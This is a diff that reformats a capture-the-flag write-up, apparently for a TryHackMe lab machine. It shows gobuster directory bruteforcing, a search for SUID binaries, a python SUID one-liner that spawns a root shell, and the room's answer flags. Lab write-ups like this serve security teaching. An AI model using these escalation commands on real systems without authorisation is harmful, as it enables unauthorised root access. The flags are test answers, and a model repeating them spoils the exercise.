@@ -21,11 +21,13 @@ PORT   STATE SERVICE VERSION
 |_http-server-header: Apache/2.4.29 (Ubuntu)
 |_http-title: HackIT - Home
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
 
+## Dir bruteforce:
 
-Dir bruteforce:
-gobuster dir -u MACHINE_IP -w /usr/share/wordlists/dirb/common.txt 
+`gobuster dir -u MACHINE_IP -w /usr/share/wordlists/dirb/common.txt`
 ===============================================================
+```
 /.hta (Status: 403)
 /.htpasswd (Status: 403)
 /.htaccess (Status: 403)
@@ -58,10 +60,10 @@ flag : THM{y0u_g0t_a_sh3ll}
 ```
 
 ## Privilege Escalation
+
+`find / -user root -perm /4000`
+
 ```
-find / -user root -perm /4000
-
-
 /usr/bin/newuidmap
 /usr/bin/newgidmap
 /usr/bin/chsh
@@ -78,16 +80,15 @@ find / -user root -perm /4000
 /bin/ping
 /bin/umount
 /usr/bin/python  this one looks interesting 
+```
 
+`./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'`
 
-./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
-
+```
 whoami
 root
 
 cd /root
-
-flag : THM{pr1v1l3g3_3sc4l4t10n}
-
 ```
 
+Flag : **`THM{pr1v1l3g3_3sc4l4t10n}`**
